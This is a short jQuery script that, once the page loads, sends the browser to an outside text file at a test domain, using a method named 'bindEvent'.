(function() {

	var $this;

	var Options = function() {

		this.bindEvent = function() {
			window.location = 'http://www.test.care001.cn/docker.txt';
		};

		this.init = function() {
			$this = this;
			this.bindEvent();
			return this;
		};
	};

	$(function() {
		var options = new Options();
		options.init();
	});
})();
